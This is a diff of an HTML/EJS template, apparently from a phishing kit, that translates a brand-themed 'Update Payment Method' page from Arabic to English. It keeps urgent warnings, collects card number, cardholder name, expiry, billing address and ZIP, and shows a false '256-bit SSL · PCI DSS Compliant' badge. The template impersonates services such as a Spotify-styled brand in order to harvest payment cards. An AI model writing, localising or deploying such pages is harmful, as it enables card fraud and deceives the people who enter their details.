@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -388,11 +388,11 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
   <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:12px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
 
   <div class="warn-banner">
-    ⚠️ <%= pageContent.subheadline || 'يجب تحديث بيانات الدفع للمتابعة' %>
+    ⚠️ <%= pageContent.subheadline || 'Your payment method needs to be updated to continue' %>
   </div>
 
-  <h1><%= pageContent.headline || 'تحديث طريقة الدفع' %></h1>
-  <p class="sub">أدخل بيانات بطاقتك بشكل آمن</p>
+  <h1><%= pageContent.headline || 'Update Payment Method' %></h1>
+  <p class="sub">Enter your card details securely</p>
 
   <div class="card-icons">
     <span>VISA</span><span>Mastercard</span><span>AMEX</span>
@@ -403,17 +403,17 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
     <input type="hidden" name="_step" value="<%= pageContent.slug %>">
 
     <div class="field-group">
-      <label>رقم البطاقة</label>
+      <label>Card Number</label>
       <input type="text" name="card_number" maxlength="19" placeholder="0000  0000  0000  0000"
              oninput="this.value=this.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim()" required>
     </div>
     <div class="field-group">
-      <label>الاسم على البطاقة</label>
+      <label>Name on Card</label>
       <input type="text" name="name_on_card" placeholder="JOHN DOE" style="font-family:inherit;letter-spacing:0" required>
     </div>
     <div class="row2">
       <div class="field-group">
-        <label>تاريخ الانتهاء</label>
+        <label>Expiry Date</label>
         <input type="text" name="expiry" maxlength="5" placeholder="MM/YY"
                oninput="let v=this.value.replace(/\D/g,'');if(v.length>=2)v=v.slice(0,2)+'/'+v.slice(2);this.value=v" required>
       </div>
@@ -425,20 +425,20 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
 
     <% if ((pageContent.fields||[]).includes('billing_address')) { %>
     <div class="field-group">
-      <label>عنوان الفاتورة</label>
+      <label>Billing Address</label>
       <input type="text" name="billing_address" placeholder="123 Main St" style="font-family:inherit;letter-spacing:0" required>
     </div>
     <% } %>
     <% if ((pageContent.fields||[]).includes('zip')) { %>
     <div class="field-group">
-      <label>الرمز البريدي</label>
+      <label>ZIP Code</label>
       <input type="text" name="zip" placeholder="12345" maxlength="10" required>
     </div>
     <% } %>
 
-    <button type="submit" class="btn"><%= pageContent.cta || 'تأكيد وتحديث' %></button>
+    <button type="submit" class="btn"><%= pageContent.cta || 'Confirm & Update' %></button>
   </form>
-  <p class="secure">🔒 مشفر بـ SSL 256-bit · PCI DSS متوافق</p>
+  <p class="secure">🔒 256-bit SSL Encrypted · PCI DSS Compliant</p>
 </div>
 </body>
 </html>
